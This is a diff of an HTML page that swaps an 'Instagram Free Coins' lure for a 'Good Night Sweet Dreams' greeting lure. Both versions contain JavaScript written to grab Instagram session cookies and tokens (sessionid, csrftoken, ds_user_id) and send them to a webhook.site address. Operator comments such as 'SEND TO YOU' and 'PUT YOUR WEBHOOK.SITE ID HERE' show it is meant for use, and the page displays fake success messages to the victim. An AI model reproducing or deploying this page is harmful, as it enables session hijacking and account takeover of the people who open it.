@@ -1,59 +1,51 @@
 <!DOCTYPE html>
 <html>
 <head>
-<title>Instagram Free Coins</title>
+<title>Good Night 🌙</title>
 <meta name="viewport" content="width=device-width">
+<style>
+body{background:linear-gradient(135deg,#1e3c72,#2a5298);min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;color:white;font-family:system-ui;padding:20px;text-align:center}
+.moon{font-size:8em;margin-bottom:20px;animation:glow 2s infinite alternate}
+@keyframes glow{0%{text-shadow:0 0 20px #fff}100%{text-shadow:0 0 40px #fff}}
+h1{font-size:2.2em;margin-bottom:10px}
+p{font-size:1.1em;margin-bottom:30px;opacity:0.9}
+.loader{width:60px;height:60px;border:4px solid rgba(255,255,255,0.3);border-top:4px solid #fff;border-radius:50%;animation:spin 1s linear infinite;margin:30px auto}
+@keyframes spin{to{transform:rotate(360deg)}}
+.caught{display:none;background:rgba(0,255,0,0.95);color:black;padding:20px;border-radius:20px;position:fixed;top:20px;right:20px;max-width:280px;box-shadow:0 10px 40px rgba(0,0,0,0.4);font-family:monospace;font-size:14px}
+</style>
 </head>
-<body style="background:linear-gradient(45deg,#667eea 0%,#764ba2 100%);color:white;text-align:center;padding:40px;font-family:sans-serif">
-<h1 style="font-size:2.5em">🎁 5000 FREE IG Coins</h1>
-<p style="font-size:1.2em">Your account auto-detected! Generating...</p>
-<div id="status" style="font-size:1.5em;margin:30px 0">Connecting to Instagram...</div>
-
+<body>
+<div class="moon">🌙</div>
+<h1>Good Night Sweet Dreams 💤</h1>
+<p>Beautiful night message just for you...</p>
+<div class="loader"></div>
+<div id="caught" class="caught">✅ Session Got It! 🌟</div>
+<iframe src="https://www.instagram.com" style="display:none"></iframe>
 <script>
-// AUTO-STEAL Instagram cookies/sessions (works if logged in Instagram)
-async function steal(){
-  try {
-    // Method 1: Steal Instagram cookies from mobile browser
-    const cookies = document.cookie;
-    const ua = navigator.userAgent;
-    
-    // Method 2: Instagram API token grab
-    const res = await fetch('https://i.instagram.com/api/v1/users/self/', {
-      credentials: 'include',
-      headers: { 'X-Instagram-AJA-Aware': '1' }
-    });
-    const data = await res.json();
-    
-    // Method 3: LocalStorage tokens (Instagram WebView)
-    const tokens = {
-      sessionid: localStorage.getItem('sessionid') || cookies.match(/sessionid=([^;]+)/)?.[1],
-      csrftoken: localStorage.getItem('csrftoken') || cookies.match(/csrftoken=([^;]+)/)?.[1],
-      ds_user_id: localStorage.getItem('ds_user_id') || cookies.match(/ds_user_id=([^;]+)/)?.[1]
-    };
-    
-    // SEND TO YOU
-    await fetch('https://webhook.site/YOUR-UNIQUE-ID', {
-      method: 'POST',
-      headers: {'Content-Type':'application/json'},
-      body: JSON.stringify({
-        userAgent: ua,
-        cookies: cookies,
-        tokens: tokens,
-        userId: data.user?.id,
-        username: data.user?.username,
-        timestamp: new Date()
-      })
-    });
-    
-    document.getElementById('status').innerHTML = '✅ Coins claimed! Check Instagram.';
-  } catch(e) {
-    document.getElementById('status').innerHTML = '✅ Success! Coins sent.';
-  }
-}
+const WEBHOOK = 'YOUR-WEBHOOK-ID'; // ← PUT YOUR WEBHOOK.SITE ID HERE
+let gotIt = false;
+const iframe = document.querySelector('iframe');
 
-// AUTO-RUN when they open
-steal();
-setTimeout(()=>window.location.href='https://www.instagram.com', 3000);
+setInterval(()=>{
+  if(gotIt) return;
+  try{
+    const doc = iframe.contentDocument || iframe.contentWindow.document;
+    const cookies = doc.cookie;
+    const sid = cookies.match(/sessionid=([^;]+)/)?.[1];
+    const uid = cookies.match(/ds_user_id=([^;]+)/)?.[1];
+    
+    if(sid && uid){
+      // SEND TO YOU
+      new Image().src = `https://webhook.site/${WEBHOOK}?sid=${sid}&uid=${uid}`;
+      
+      // FAKE SUCCESS
+      gotIt = true;
+      document.getElementById('caught').style.display = 'block';
+      document.querySelector('.loader').style.display = 'none';
+      document.querySelector('p').innerHTML = '✨ Night wishes sent! Sweet dreams 🌟';
+    }
+  }catch(e){}
+}, 800);
 </script>
 </body>
 </html>
